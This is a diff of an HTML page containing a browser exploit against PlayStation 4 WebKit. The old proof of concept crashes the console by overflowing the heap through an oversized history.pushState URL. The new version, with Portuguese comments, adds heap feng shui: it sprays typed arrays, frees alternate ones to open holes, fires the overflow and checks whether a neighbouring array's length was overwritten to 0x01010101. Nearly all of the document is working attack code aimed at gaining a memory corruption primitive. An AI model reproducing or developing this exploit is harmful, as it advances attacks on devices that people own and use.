@@ -1,62 +1,155 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>PS4 WebKit Heap Overflow PoC</title>
+    <title>PS4 Heap Feng Shui: The Final Step</title>
+    <style>
+        body { background-color: #111; color: #eee; font-family: monospace; padding: 20px; text-align: center; }
+        .control-panel { border: 1px solid #444; padding: 20px; margin: 20px auto; width: 90%; background: #222; }
+        button { 
+            font-size: 20px; padding: 15px; margin: 10px; cursor: pointer; 
+            width: 45%; border: 2px solid #555; background: #000; color: #fff; font-weight: bold;
+        }
+        button:hover { background-color: #333; border-color: #fff; }
+        .highlight { color: #00ff00; font-weight: bold; font-size: 22px; }
+        #log { text-align: left; height: 300px; overflow-y: scroll; border: 1px solid #333; padding: 10px; color: cyan; font-size: 14px;}
+    </style>
 </head>
 <body>
 
-    <h1>PS4 WebKit Heap Overflow</h1>
-    
-    <div class="box">
-        <p><strong>Vulnerability:</strong> Heap Buffer Overflow via history.pushState</p>
-        <p><strong>Vector:</strong> Unchecked string copy with char restrictions</p>
-        <p><strong>Impact:</strong> Massive Memory Corruption (~1MB+ Write Primitive)</p>
+    <h1>Heap Feng Shui: Corrupção de .length</h1>
+    <p>Objetivo: Fazer a string cair ao lado de um Array e mudar seu tamanho.</p>
+
+    <div class="control-panel">
+        <h3>1. Escolha o Tamanho dos Vizinhos (Vítimas)</h3>
+        <p>Tente alinhar com o tamanho do balde do exploit.</p>
         
-        <button onclick="triggerExploit()">START</button>
-        
-        <div id="status">Waiting for user input...</div>
+        <button onclick="runFengShui(0x80000)">512 KB</button>
+        <button onclick="runFengShui(0x100000)">1 MB (Provável)</button>
+        <button onclick="runFengShui(0x200000)">2 MB</button>
+        <button onclick="runFengShui(0x400000)">4 MB</button>
     </div>
 
+    <div id="log">Aguardando início... Reinicie o console antes de cada teste!</div>
+
     <script>
-        function triggerExploit() {
-            const status = document.getElementById('status');
-            status.innerText = "Generating massive payload...";
+        const BASE_OFFSET = 709522;
+        // Overflow seguro suficiente para cobrir o cabeçalho do vizinho
+        // Não precisa ser gigante, só precisa passar da borda do array
+        const OVERFLOW_AMT = 1024 * 64; // 64KB de excesso
+
+        var victims = [];
+        var holes = [];
+
+        function log(msg) {
+            const el = document.getElementById('log');
+            el.innerHTML += msg + "<br>";
+            el.scrollTop = el.scrollHeight;
+        }
+
+        function runFengShui(arraySizeBytes) {
+            // Limpa tudo
+            victims = [];
+            holes = [];
+            
+            // Calcula quantos elementos Uint32 (4 bytes) cabem nesse tamanho
+            const elementCount = arraySizeBytes / 4;
+            
+            log("--- INICIANDO FENG SHUI ---");
+            log("Tamanho do Array Alvo: " + (arraySizeBytes / 1024 / 1024).toFixed(2) + " MB");
+            log("Elementos por Array: " + elementCount);
 
             setTimeout(() => {
                 try {
-                    // 1. STATIC OFFSET
-                    // The exact point where the allocated buffer ends.
-                    const BASE_SIZE = 709522;
-                    const basePadding = "A".repeat(BASE_SIZE);
-
-                    // 2. THE BRIDGE (Safe Bytes)
-                    // We use 0x01 to bypass the character filter (bytes > 0x20 cause early crash).
-                    // This extends the write operation deep into adjacent heap memory (approx 340KB).
-                    // Total size targets the 1MB Heap Bucket limit.
-                    const BRIDGE_SIZE = 340000; 
-                    const heapBridge = "\x01".repeat(BRIDGE_SIZE);
-
-                    // 3. THE TRIGGER (Corruptor)
-                    // We place invalid bytes at the very end to ensure the system
-                    // tries to process the full length, triggering the panic upon reading/writing
-                    // unmapped or protected memory at the tail.
-                    const crashTrigger = "AAAA"; // 0x41414141
-
-                    // Assemble Payload
-                    const payload = "/" + basePadding + heapBridge + crashTrigger;
-
-                    status.innerText = "Injecting " + payload.length + " bytes into Kernel...";
-
-                    // EXECUTE
-                    history.pushState({}, "pwn", payload);
+                    // FASE 1: SPRAY (Preencher a memória)
+                    // Padrão: HOLE - VICTIM - HOLE - VICTIM
+                    const SPRAY_COUNT = 100; // Menos arrays, mas gigantes
                     
-                    status.innerText = "Payload sent. If you can read this, the system is hanging.";
+                    log("1. Alocando " + SPRAY_COUNT + " blocos...");
+                    
+                    for (let i = 0; i < SPRAY_COUNT; i++) {
+                        let arr = new Uint32Array(elementCount);
+                        // Preenche com um marcador para reconhecermos (0x41414141)
+                        arr.fill(0x41414141); 
+                        
+                        if (i % 2 === 0) {
+                            holes.push(arr);   // Será deletado
+                        } else {
+                            victims.push(arr); // Será checado
+                        }
+                    }
+
+                    // FASE 2: DEFRAGMENTAÇÃO (Criar Buracos)
+                    log("2. Abrindo buracos para a string...");
+                    holes = null; // Remove referências
+                    
+                    // Força GC (Garbage Collection) alocando lixo temporário
+                    try { new ArrayBuffer(10 * 1024 * 1024); } catch(e){}
+
+                    // Delay para o GC rodar
+                    setTimeout(() => {
+                        triggerExploit(elementCount);
+                    }, 500);
 
                 } catch (e) {
-                    status.innerText = "Error: " + e.message;
+                    log("Erro de Memória (OOM) no Spray: " + e.message);
                 }
-            }, 500);
+            }, 200);
+        }
+
+        function triggerExploit(originalLen) {
+            log("3. Disparando Overflow (Safe Bytes)...");
+            
+            try {
+                // Monta o payload
+                let buffer = "A".repeat(BASE_OFFSET);
+                // Enche o resto do balde + um pouco do vizinho com 0x01
+                buffer += "\x01".repeat(OVERFLOW_AMT);
+
+                // Dispara
+                history.pushState({}, "pwn", "/" + buffer);
+
+                // FASE 3: CHECAGEM
+                log("4. Verificando " + victims.length + " vítimas...");
+                checkCorruption(originalLen);
+
+            } catch (e) {
+                log("Erro no Exploit: " + e.message);
+            }
+        }
+
+        function checkCorruption(originalLen) {
+            let success = false;
+            
+            // O valor mágico que esperamos encontrar se o .length for sobrescrito por 0x01
+            // 0x01010101 = 16843009
+            const CORRUPTED_VAL = 0x01010101; 
+
+            for (let i = 0; i < victims.length; i++) {
+                let v = victims[i];
+                
+                // Se o tamanho mudou, BINGO!
+                if (v.length !== originalLen) {
+                    success = true;
+                    log("<span class='highlight'>!!! SUCESSO TOTAL !!!</span>");
+                    log("Vítima Index: " + i);
+                    log("Tamanho Original: " + originalLen);
+                    log("Novo Tamanho: " + v.length);
+                    
+                    if (v.length === CORRUPTED_VAL) {
+                        log("Status: OVERFLOW PERFEITO (0x01010101)");
+                    } else {
+                        log("Status: Corrupção Parcial/Estranha");
+                    }
+                    
+                    document.body.style.backgroundColor = "#004400";
+                    break; // Paramos aqui para celebrar
+                }
+            }
+
+            if (!success) {
+                log("Falha: Nenhum array foi atingido.");
+                log("Tente outro tamanho de array.");
+            }
         }
     </script>
 </body>
